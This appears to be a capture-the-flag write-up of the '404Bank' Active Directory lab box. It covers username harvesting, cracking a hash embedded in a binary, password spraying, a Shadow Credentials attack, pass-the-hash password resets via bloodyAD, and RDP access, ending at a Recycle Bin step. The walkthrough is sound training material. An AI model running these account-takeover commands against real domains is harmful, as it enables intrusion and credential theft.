---
title: HackSmarter - 404Bank
date: 2026-07-02
image: cover.png
tags: [HackSmarter, Medium, Windows, Active Directory]
excerpt: A medium Active Directory box that decodes a hardcoded hash from a fake banking binary for a foothold, walks an ACL chain of ForceChangePassword and Shadow Credentials edges to loot credentials, pivots through ligolo to an internal admin app, re-enables a disabled service account, and abuses an AD CS ESC4 template to impersonate the Administrator.
---

# 404bank

### NMAP Scanning

```python
PORT      STATE SERVICE       REASON          VERSION
53/tcp    open  domain        syn-ack ttl 126 Simple DNS Plus
80/tcp    open  http          syn-ack ttl 126 Microsoft IIS httpd 10.0
| http-methods:
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: 404 Finance Group
88/tcp    open  kerberos-sec  syn-ack ttl 126 Microsoft Windows Kerberos (server time: 2026-07-02 09:48:12Z)
135/tcp   open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack ttl 126 Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: 404finance.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-02T09:49:48+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC-404.404finance.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-404.404finance.local
| Issuer: commonName=404finance-DC-404-CA/domainComponent=404finance
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-02T09:33:40
| Not valid after:  2027-07-02T09:33:40
| MD5:   84c8:87f2:8bbe:c5b9:4f92:ac9c:7356:9ad5
| SHA-1: ea20:8e28:b5c4:b6b8:ef12:6418:089e:77ef:5520:20c0
| -----BEGIN CERTIFICATE-----
| MIIGXTCCBUWgAwIBAgITFAAAAAQLLBMjHMvWXgAAAAAABDANBgkqhkiG9w0BAQsF
| ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGjAYBgoJkiaJk/IsZAEZFgo0MDRm
| aW5hbmNlMR0wGwYDVQQDExQ0MDRmaW5hbmNlLURDLTQwNC1DQTAeFw0yNjA3MDIw
| OTMzNDBaFw0yNzA3MDIwOTMzNDBaMCIxIDAeBgNVBAMTF0RDLTQwNC40MDRmaW5h
| bmNlLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0bMvfWac
| 0loK1Kjc97XG+eO2HKbJoZW8haUfaK7CpWz1PvTVehWFh9KsZZpBvK+k3kxiQWRe
| I4DhyHKromdcCKJi4l3nVO5T/MLb0n3Ac1YBIQQBecKoY8u/gBr7y7+6hwk1rAdr
| 4KxV00BcjsOGoFvGc7/sSia63TvNXusZtXHxsdzeC18Fwv7vVrj+ECTZ+yx/QKZs
| /7QfbLpl3aOK6AfptKVg/oHF1xIQWeNucAaPHirQzA/SAndZt+6rSBDG7+eYma7r
| BFyiq1nFUtqnTWmQPGlkeEc7rzLEXaFgJSn0b08GyFL07+w9MMEoKurFwQyHFMiI
| /TL9QdTLXj33hQIDAQABo4IDWjCCA1YwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBh
| AGkAbgBDAG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggr
| BgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG
| 9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQME
| AS0wCwYJYIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0D
| BzBOBgkrBgEEAYI3GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjk1
| NjcyNTQ3My0zMTc3ODI5MTgtMjc5NTYzNjQ5Ni0xMDAwMEMGA1UdEQQ8MDqgHwYJ
| KwYBBAGCNxkBoBIEEK1hmBpV6VRDsBwTXMBWTSGCF0RDLTQwNC40MDRmaW5hbmNl
| LmxvY2FsMB0GA1UdDgQWBBRtBxUh1TeYKmtmWjlZJraFg1/bRTAfBgNVHSMEGDAW
| gBRgIMOnTM3OPWGfrbttZWinJuJCpDCB1gYDVR0fBIHOMIHLMIHIoIHFoIHChoG/
| bGRhcDovLy9DTj00MDRmaW5hbmNlLURDLTQwNC1DQSxDTj1EQy00MDQsQ049Q0RQ
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9NDA0ZmluYW5jZSxEQz1sb2NhbD9jZXJ0aWZpY2F0ZVJldm9j
| YXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQw
| gcsGCCsGAQUFBwEBBIG+MIG7MIG4BggrBgEFBQcwAoaBq2xkYXA6Ly8vQ049NDA0
| ZmluYW5jZS1EQy00MDQtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9NDA0ZmluYW5jZSxE
| Qz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNh
| dGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAumIL0eqvTtRnjkkUEE1h
| rVg3RNj+I8C7GPQOrk9BXb5PLkQOBzCV8524FRAkGT3Rnoc4TuZZB/zgIzwXEamj
| IDxzcQe6Mi7y0WSLDQHK1Swg0xhQHlG8P+nT9mJ6jSxaRDWLrBMwLIRQ8lOYETj0
| qfqMeExE3RdUk1A15+wAchHuiTtVTCGAzmeUTm5pn1gb5gNFk3Sgr3I9+RyOz+5F
| VFmn4zh2P9XPXtCO9incBvJuCxz73fMdwkcvGwSkDT4vRfPomTlohBP3hx6Ngp1i
| BM3HKt7SPRj2g+d3S5WPRB8v35Itf9HWLRQ3rg3sQEEyswxpOwwDZkLqL6/E+1Y9
| 3g==
|_-----END CERTIFICATE-----
445/tcp   open  microsoft-ds? syn-ack ttl 126
464/tcp   open  kpasswd5?     syn-ack ttl 126
593/tcp   open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: 404finance.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-02T09:49:48+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC-404.404finance.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-404.404finance.local
| Issuer: commonName=404finance-DC-404-CA/domainComponent=404finance
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-02T09:33:40
| Not valid after:  2027-07-02T09:33:40
| MD5:   84c8:87f2:8bbe:c5b9:4f92:ac9c:7356:9ad5
| SHA-1: ea20:8e28:b5c4:b6b8:ef12:6418:089e:77ef:5520:20c0
| -----BEGIN CERTIFICATE-----
| MIIGXTCCBUWgAwIBAgITFAAAAAQLLBMjHMvWXgAAAAAABDANBgkqhkiG9w0BAQsF
| ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGjAYBgoJkiaJk/IsZAEZFgo0MDRm
| aW5hbmNlMR0wGwYDVQQDExQ0MDRmaW5hbmNlLURDLTQwNC1DQTAeFw0yNjA3MDIw
| OTMzNDBaFw0yNzA3MDIwOTMzNDBaMCIxIDAeBgNVBAMTF0RDLTQwNC40MDRmaW5h
| bmNlLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0bMvfWac
| 0loK1Kjc97XG+eO2HKbJoZW8haUfaK7CpWz1PvTVehWFh9KsZZpBvK+k3kxiQWRe
| I4DhyHKromdcCKJi4l3nVO5T/MLb0n3Ac1YBIQQBecKoY8u/gBr7y7+6hwk1rAdr
| 4KxV00BcjsOGoFvGc7/sSia63TvNXusZtXHxsdzeC18Fwv7vVrj+ECTZ+yx/QKZs
| /7QfbLpl3aOK6AfptKVg/oHF1xIQWeNucAaPHirQzA/SAndZt+6rSBDG7+eYma7r
| BFyiq1nFUtqnTWmQPGlkeEc7rzLEXaFgJSn0b08GyFL07+w9MMEoKurFwQyHFMiI
| /TL9QdTLXj33hQIDAQABo4IDWjCCA1YwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBh
| AGkAbgBDAG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggr
| BgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG
| 9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQME
| AS0wCwYJYIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0D
| BzBOBgkrBgEEAYI3GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjk1
| NjcyNTQ3My0zMTc3ODI5MTgtMjc5NTYzNjQ5Ni0xMDAwMEMGA1UdEQQ8MDqgHwYJ
| KwYBBAGCNxkBoBIEEK1hmBpV6VRDsBwTXMBWTSGCF0RDLTQwNC40MDRmaW5hbmNl
| LmxvY2FsMB0GA1UdDgQWBBRtBxUh1TeYKmtmWjlZJraFg1/bRTAfBgNVHSMEGDAW
| gBRgIMOnTM3OPWGfrbttZWinJuJCpDCB1gYDVR0fBIHOMIHLMIHIoIHFoIHChoG/
| bGRhcDovLy9DTj00MDRmaW5hbmNlLURDLTQwNC1DQSxDTj1EQy00MDQsQ049Q0RQ
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9NDA0ZmluYW5jZSxEQz1sb2NhbD9jZXJ0aWZpY2F0ZVJldm9j
| YXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQw
| gcsGCCsGAQUFBwEBBIG+MIG7MIG4BggrBgEFBQcwAoaBq2xkYXA6Ly8vQ049NDA0
| ZmluYW5jZS1EQy00MDQtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9NDA0ZmluYW5jZSxE
| Qz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNh
| dGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAumIL0eqvTtRnjkkUEE1h
| rVg3RNj+I8C7GPQOrk9BXb5PLkQOBzCV8524FRAkGT3Rnoc4TuZZB/zgIzwXEamj
| IDxzcQe6Mi7y0WSLDQHK1Swg0xhQHlG8P+nT9mJ6jSxaRDWLrBMwLIRQ8lOYETj0
| qfqMeExE3RdUk1A15+wAchHuiTtVTCGAzmeUTm5pn1gb5gNFk3Sgr3I9+RyOz+5F
| VFmn4zh2P9XPXtCO9incBvJuCxz73fMdwkcvGwSkDT4vRfPomTlohBP3hx6Ngp1i
| BM3HKt7SPRj2g+d3S5WPRB8v35Itf9HWLRQ3rg3sQEEyswxpOwwDZkLqL6/E+1Y9
| 3g==
|_-----END CERTIFICATE-----
3268/tcp  open  ldap          syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: 404finance.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-02T09:49:48+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC-404.404finance.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-404.404finance.local
| Issuer: commonName=404finance-DC-404-CA/domainComponent=404finance
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-02T09:33:40
| Not valid after:  2027-07-02T09:33:40
| MD5:   84c8:87f2:8bbe:c5b9:4f92:ac9c:7356:9ad5
| SHA-1: ea20:8e28:b5c4:b6b8:ef12:6418:089e:77ef:5520:20c0
| -----BEGIN CERTIFICATE-----
| MIIGXTCCBUWgAwIBAgITFAAAAAQLLBMjHMvWXgAAAAAABDANBgkqhkiG9w0BAQsF
| ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGjAYBgoJkiaJk/IsZAEZFgo0MDRm
| aW5hbmNlMR0wGwYDVQQDExQ0MDRmaW5hbmNlLURDLTQwNC1DQTAeFw0yNjA3MDIw
| OTMzNDBaFw0yNzA3MDIwOTMzNDBaMCIxIDAeBgNVBAMTF0RDLTQwNC40MDRmaW5h
| bmNlLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0bMvfWac
| 0loK1Kjc97XG+eO2HKbJoZW8haUfaK7CpWz1PvTVehWFh9KsZZpBvK+k3kxiQWRe
| I4DhyHKromdcCKJi4l3nVO5T/MLb0n3Ac1YBIQQBecKoY8u/gBr7y7+6hwk1rAdr
| 4KxV00BcjsOGoFvGc7/sSia63TvNXusZtXHxsdzeC18Fwv7vVrj+ECTZ+yx/QKZs
| /7QfbLpl3aOK6AfptKVg/oHF1xIQWeNucAaPHirQzA/SAndZt+6rSBDG7+eYma7r
| BFyiq1nFUtqnTWmQPGlkeEc7rzLEXaFgJSn0b08GyFL07+w9MMEoKurFwQyHFMiI
| /TL9QdTLXj33hQIDAQABo4IDWjCCA1YwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBh
| AGkAbgBDAG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggr
| BgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG
| 9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQME
| AS0wCwYJYIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0D
| BzBOBgkrBgEEAYI3GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjk1
| NjcyNTQ3My0zMTc3ODI5MTgtMjc5NTYzNjQ5Ni0xMDAwMEMGA1UdEQQ8MDqgHwYJ
| KwYBBAGCNxkBoBIEEK1hmBpV6VRDsBwTXMBWTSGCF0RDLTQwNC40MDRmaW5hbmNl
| LmxvY2FsMB0GA1UdDgQWBBRtBxUh1TeYKmtmWjlZJraFg1/bRTAfBgNVHSMEGDAW
| gBRgIMOnTM3OPWGfrbttZWinJuJCpDCB1gYDVR0fBIHOMIHLMIHIoIHFoIHChoG/
| bGRhcDovLy9DTj00MDRmaW5hbmNlLURDLTQwNC1DQSxDTj1EQy00MDQsQ049Q0RQ
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9NDA0ZmluYW5jZSxEQz1sb2NhbD9jZXJ0aWZpY2F0ZVJldm9j
| YXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQw
| gcsGCCsGAQUFBwEBBIG+MIG7MIG4BggrBgEFBQcwAoaBq2xkYXA6Ly8vQ049NDA0
| ZmluYW5jZS1EQy00MDQtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9NDA0ZmluYW5jZSxE
| Qz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNh
| dGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAumIL0eqvTtRnjkkUEE1h
| rVg3RNj+I8C7GPQOrk9BXb5PLkQOBzCV8524FRAkGT3Rnoc4TuZZB/zgIzwXEamj
| IDxzcQe6Mi7y0WSLDQHK1Swg0xhQHlG8P+nT9mJ6jSxaRDWLrBMwLIRQ8lOYETj0
| qfqMeExE3RdUk1A15+wAchHuiTtVTCGAzmeUTm5pn1gb5gNFk3Sgr3I9+RyOz+5F
| VFmn4zh2P9XPXtCO9incBvJuCxz73fMdwkcvGwSkDT4vRfPomTlohBP3hx6Ngp1i
| BM3HKt7SPRj2g+d3S5WPRB8v35Itf9HWLRQ3rg3sQEEyswxpOwwDZkLqL6/E+1Y9
| 3g==
|_-----END CERTIFICATE-----
3269/tcp  open  ssl/ldap      syn-ack ttl 126 Microsoft Windows Active Directory LDAP (Domain: 404finance.local, Site: Default-First-Site-Name)
|_ssl-date: 2026-07-02T09:49:48+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC-404.404finance.local
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:DC-404.404finance.local
| Issuer: commonName=404finance-DC-404-CA/domainComponent=404finance
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-02T09:33:40
| Not valid after:  2027-07-02T09:33:40
| MD5:   84c8:87f2:8bbe:c5b9:4f92:ac9c:7356:9ad5
| SHA-1: ea20:8e28:b5c4:b6b8:ef12:6418:089e:77ef:5520:20c0
| -----BEGIN CERTIFICATE-----
| MIIGXTCCBUWgAwIBAgITFAAAAAQLLBMjHMvWXgAAAAAABDANBgkqhkiG9w0BAQsF
| ADBSMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxGjAYBgoJkiaJk/IsZAEZFgo0MDRm
| aW5hbmNlMR0wGwYDVQQDExQ0MDRmaW5hbmNlLURDLTQwNC1DQTAeFw0yNjA3MDIw
| OTMzNDBaFw0yNzA3MDIwOTMzNDBaMCIxIDAeBgNVBAMTF0RDLTQwNC40MDRmaW5h
| bmNlLmxvY2FsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0bMvfWac
| 0loK1Kjc97XG+eO2HKbJoZW8haUfaK7CpWz1PvTVehWFh9KsZZpBvK+k3kxiQWRe
| I4DhyHKromdcCKJi4l3nVO5T/MLb0n3Ac1YBIQQBecKoY8u/gBr7y7+6hwk1rAdr
| 4KxV00BcjsOGoFvGc7/sSia63TvNXusZtXHxsdzeC18Fwv7vVrj+ECTZ+yx/QKZs
| /7QfbLpl3aOK6AfptKVg/oHF1xIQWeNucAaPHirQzA/SAndZt+6rSBDG7+eYma7r
| BFyiq1nFUtqnTWmQPGlkeEc7rzLEXaFgJSn0b08GyFL07+w9MMEoKurFwQyHFMiI
| /TL9QdTLXj33hQIDAQABo4IDWjCCA1YwLwYJKwYBBAGCNxQCBCIeIABEAG8AbQBh
| AGkAbgBDAG8AbgB0AHIAbwBsAGwAZQByMB0GA1UdJQQWMBQGCCsGAQUFBwMCBggr
| BgEFBQcDATAOBgNVHQ8BAf8EBAMCBaAweAYJKoZIhvcNAQkPBGswaTAOBggqhkiG
| 9w0DAgICAIAwDgYIKoZIhvcNAwQCAgCAMAsGCWCGSAFlAwQBKjALBglghkgBZQME
| AS0wCwYJYIZIAWUDBAECMAsGCWCGSAFlAwQBBTAHBgUrDgMCBzAKBggqhkiG9w0D
| BzBOBgkrBgEEAYI3GQIEQTA/oD0GCisGAQQBgjcZAgGgLwQtUy0xLTUtMjEtMjk1
| NjcyNTQ3My0zMTc3ODI5MTgtMjc5NTYzNjQ5Ni0xMDAwMEMGA1UdEQQ8MDqgHwYJ
| KwYBBAGCNxkBoBIEEK1hmBpV6VRDsBwTXMBWTSGCF0RDLTQwNC40MDRmaW5hbmNl
| LmxvY2FsMB0GA1UdDgQWBBRtBxUh1TeYKmtmWjlZJraFg1/bRTAfBgNVHSMEGDAW
| gBRgIMOnTM3OPWGfrbttZWinJuJCpDCB1gYDVR0fBIHOMIHLMIHIoIHFoIHChoG/
| bGRhcDovLy9DTj00MDRmaW5hbmNlLURDLTQwNC1DQSxDTj1EQy00MDQsQ049Q0RQ
| LENOPVB1YmxpYyUyMEtleSUyMFNlcnZpY2VzLENOPVNlcnZpY2VzLENOPUNvbmZp
| Z3VyYXRpb24sREM9NDA0ZmluYW5jZSxEQz1sb2NhbD9jZXJ0aWZpY2F0ZVJldm9j
| YXRpb25MaXN0P2Jhc2U/b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQw
| gcsGCCsGAQUFBwEBBIG+MIG7MIG4BggrBgEFBQcwAoaBq2xkYXA6Ly8vQ049NDA0
| ZmluYW5jZS1EQy00MDQtQ0EsQ049QUlBLENOPVB1YmxpYyUyMEtleSUyMFNlcnZp
| Y2VzLENOPVNlcnZpY2VzLENOPUNvbmZpZ3VyYXRpb24sREM9NDA0ZmluYW5jZSxE
| Qz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jhc2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNh
| dGlvbkF1dGhvcml0eTANBgkqhkiG9w0BAQsFAAOCAQEAumIL0eqvTtRnjkkUEE1h
| rVg3RNj+I8C7GPQOrk9BXb5PLkQOBzCV8524FRAkGT3Rnoc4TuZZB/zgIzwXEamj
| IDxzcQe6Mi7y0WSLDQHK1Swg0xhQHlG8P+nT9mJ6jSxaRDWLrBMwLIRQ8lOYETj0
| qfqMeExE3RdUk1A15+wAchHuiTtVTCGAzmeUTm5pn1gb5gNFk3Sgr3I9+RyOz+5F
| VFmn4zh2P9XPXtCO9incBvJuCxz73fMdwkcvGwSkDT4vRfPomTlohBP3hx6Ngp1i
| BM3HKt7SPRj2g+d3S5WPRB8v35Itf9HWLRQ3rg3sQEEyswxpOwwDZkLqL6/E+1Y9
| 3g==
|_-----END CERTIFICATE-----
3389/tcp  open  ms-wbt-server syn-ack ttl 126 Microsoft Terminal Services
| rdp-ntlm-info:
|   Target_Name: FINANCE404
|   NetBIOS_Domain_Name: FINANCE404
|   NetBIOS_Computer_Name: DC-404
|   DNS_Domain_Name: 404finance.local
|   DNS_Computer_Name: DC-404.404finance.local
|   DNS_Tree_Name: 404finance.local
|   Product_Version: 10.0.17763
|_  System_Time: 2026-07-02T09:49:09+00:00
|_ssl-date: 2026-07-02T09:49:48+00:00; 0s from scanner time.
| ssl-cert: Subject: commonName=DC-404.404finance.local
| Issuer: commonName=DC-404.404finance.local
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2026-07-01T09:42:39
| Not valid after:  2026-12-31T09:42:39
| MD5:   c54f:9332:9f75:b706:3f90:954d:3d6e:dddd
| SHA-1: f3ab:13e3:aa22:c1f7:c8e7:5a2c:e8aa:3e8c:c8b0:b4b0
| -----BEGIN CERTIFICATE-----
| MIIC8jCCAdqgAwIBAgIQFRIq2OZ7r6RGYEkYaku9dTANBgkqhkiG9w0BAQsFADAi
| MSAwHgYDVQQDExdEQy00MDQuNDA0ZmluYW5jZS5sb2NhbDAeFw0yNjA3MDEwOTQy
| MzlaFw0yNjEyMzEwOTQyMzlaMCIxIDAeBgNVBAMTF0RDLTQwNC40MDRmaW5hbmNl
| LmxvY2FsMIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA1UN5DpKxXI0r
| lPm7M9RxUIkuaVJIqMc93U6rrshcA98D4aT/g6gDq6nWQOZ/ucjeqwGyYuSlf2IV
| 6IZ+5eYcEdqp1sKTw93CTVO72/TMG9oFiVH64eO0NXSrnJ4xs00zXMMdSXRhAIz0
| Km/wt8yAkXgtZXYWCGUgTckpronNw3d8ah4vt/rGtUYZR9jgZXDeU8DqgrxU14XC
| YbE0sDJUycUBeOPzpmnXYcWI5JMdzzsZ/Ou0ghTRFNrti8sF0RaTOZTsQBvbf82H
| Bbv5Z3DJr+r3psD1iDiQxbVldPXmNS/4nDSqOXGK3kwevx0sB0RI7wY2LPIamIVG
| NHruGf5kTQIDAQABoyQwIjATBgNVHSUEDDAKBggrBgEFBQcDATALBgNVHQ8EBAMC
| BDAwDQYJKoZIhvcNAQELBQADggEBAKOm8hrxQQOSPcbXU4oMxaTfw9qQF2bgIoZv
| GgwT8liax0h3cB7oRp8JJtcfW30DhPlVz3DBMgRxgnlFM1vSRqOw+ZPHTXhaDfS6
| 9a7x7yOLy/czXyEcGBcVaseUZPD50qnAIKAzbPOlVJw9ry5XsyCnUJNnoklp8Wwd
| TFJ6E33ufgN9KCwR0V4TjG4LoevB8z5uAokRKUb9uFf5qrtAsznhZQUGX0y6FcvI
| W+qxrBy+ZBDeoDSbCwFrbJNpOojqoc7yFzyyTLVP5kfoA/610lcfh7BOIGMOJXfR
| 3dSkKpStXqpt1eljAn/U26ir01FeoVc0AY8niQ+vzjUlNtld91w=
|_-----END CERTIFICATE-----
5985/tcp  open  http          syn-ack ttl 126 Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        syn-ack ttl 126 .NET Message Framing
49667/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49669/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49670/tcp open  ncacn_http    syn-ack ttl 126 Microsoft Windows RPC over HTTP 1.0
49673/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49681/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49702/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49718/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
49729/tcp open  msrpc         syn-ack ttl 126 Microsoft Windows RPC
Service Info: Host: DC-404; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| p2p-conficker:
|   Checking for Conficker.C or higher...
|   Check 1 (port 23060/tcp): CLEAN (Timeout)
|   Check 2 (port 55934/tcp): CLEAN (Timeout)
|   Check 3 (port 16478/udp): CLEAN (Timeout)
|   Check 4 (port 15848/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked
| smb2-time:
|   date: 2026-07-02T09:49:12
|_  start_date: N/A
| smb2-security-mode:
|   3:1:1:
|_    Message signing enabled and required
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
```

### SMB - Guest & NULL Authentication

{% image %}

Neither Guest nor NULL authentication is accepted. The domain and host still need to resolve, so the `/etc/hosts` entries are generated with `--generate-hosts-file hosts.txt`:

{% image2 %}

### WebServer Enumeration

The home page includes a Meet Our Team section listing three people:

{% image3 %}

Further down, the "What Our Clients Say" section adds a few more names:

{% image4 %}

Combining these into a names list to generate permutations for candidate domain usernames:

```python
➜  404bank cat names.txt
Alex Meier
Robert Graef
Karl Hackermann
Nina Inkasso
Daniel Hoffmann
Melanie Kunz
```

Running [namemash.py](http://namemash.py) to build the permutations and `kerbrute` to confirm which of them exist in the domain: `python3 /opt/miscellaneous/namemash.py names.txt > possible_domain_users.txt`

{% image5 %}

The `/services.html` endpoint on the website advertises an online banking application called "CorpBankDialer.exe":

{% image6 %}

Downloading the file reveals that, despite the `.exe` extension, it is actually an ELF 64-bit Linux executable:

{% image7 %}

Executing it prints a base64-encoded string:

```python
Welcome to CorpBank SecureAccess v3.7.2\nDEBUG: ZGQyZWYzNDUzMGRlN2U1YmVmMjJhMDVlN2U1ZGQxNzg=\n%
```

Decoding it with `base64`:

{% image8 %}

Running the result through `hash-identifier` or `hashid` shows it is an MD5 hash:

{% image9 %}

Cracking it with `john` using `--format=Raw-MD5`:

{% image10 %}

Spraying the recovered password with `netexec` lands a valid hit on `karl.hackermann`:

{% image11 %}

Enumerating the shares shows only the default ones:

{% image12 %}

### Active Directory - Domain Reconnaissance

With a valid set of credentials, the domain can be enumerated with `rusthound-ce`:

```python
rusthound --domain 404finance.local --ldapusername 'karl.hackermann' --ldappassword 'Password123!!' --ldapfqdn DC-404.404finance.local --ldapip 10.1.92.153 --name-server 10.1.92.153 --collectionmethod All --zip
```

{% image13 %}

The BloodHound data shows the current user holds `GenericWrite` over the user `TOM.REBOOT`:

{% image14 %}

`TOM.REBOOT` in turn holds `ForceChangePassword` over the user `ROBERT.GRAEF`:

{% image15 %}

`ROBERT.GRAEF` then carries `AddMember` and `ForceChangePassword` ACLs:

{% image16 %}

It can add members to the Remote Desktop Users group and reset the passwords of `MELANIE.KUNZ`, `JAN.TRESOR`, and `NINA.INKASSO`.

### Active Directory - Privilege Escalation

The attack chain starts with a Shadow Credentials attack against `TOM.REBOOT`, using the `GenericWrite` edge to recover its NT hash:

```python
certipy-ad shadow auto -u 'karl.hackermann' -p 'Password123!!' -account 'TOM.REBOOT' -dc-ip 10.1.92.153
```

{% image17 %}

Using that hash to reset the password of `ROBERT.GRAEF`:

```python
bloodyAD -d 404finance.local -u 'TOM.REBOOT' -p :89551acff8895768e489bb3054af94fd -i 10.1.92.153 set password 'ROBERT.GRAEF' 'Password123!'
```

{% image18 %}

`ROBERT.GRAEF` can now reset the passwords of the three users and add accounts to the Remote Desktop Users group, which grants RDP access to any member.

After resetting each of them, only `JAN.TRESOR` has anything of interest on its desktop, so that account is the one to pursue:

{% image19 %}

Adding this user to the `Remote Desktop Users` group:

{% image20 %}

Connecting over RDP with `xfreerdp3`: `xfreerdp3 /u:JAN.TRESOR /p:'Password123!' /v:10.1.92.153`

{% image21 %}

The Recycle Bin holds several files worth inspecting:

{% image22 %}

